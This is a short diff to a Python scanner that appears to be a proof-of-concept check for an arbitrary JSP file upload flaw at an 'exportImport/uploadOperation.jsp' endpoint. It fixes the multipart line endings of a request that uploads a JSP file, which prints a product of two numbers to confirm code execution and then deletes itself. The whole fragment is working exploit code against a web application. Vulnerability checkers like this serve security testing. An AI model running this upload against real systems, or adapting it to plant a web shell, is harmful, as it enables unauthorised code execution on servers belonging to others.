@@ -26,12 +26,12 @@ def scan(baseurl):
 	else:
 		baseurl=baseurl+"/"
 	url=baseurl+"page/exportImport/uploadOperation.jsp"
-	body='''--b0d829daa06c13d6b3e16b0ad21d1eed\n
-Content-Disposition: form-data; name="file"; filename="'''+r1+'''.jsp"\n
+	body='''--b0d829daa06c13d6b3e16b0ad21d1eed\r
+Content-Disposition: form-data; name="file"; filename="'''+r1+'''.jsp"\r
 Content-Type: application/octet-stream\r
-\n
-<%out.print('''+str(r2)+''' * '''+str(r3)+''');new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\n
---b0d829daa06c13d6b3e16b0ad21d1eed--\n
+\r
+<%out.print('''+str(r2)+''' * '''+str(r3)+''');new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r
+--b0d829daa06c13d6b3e16b0ad21d1eed--\r
 '''
 	headers={'Content-Type': 'multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed'}
 	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
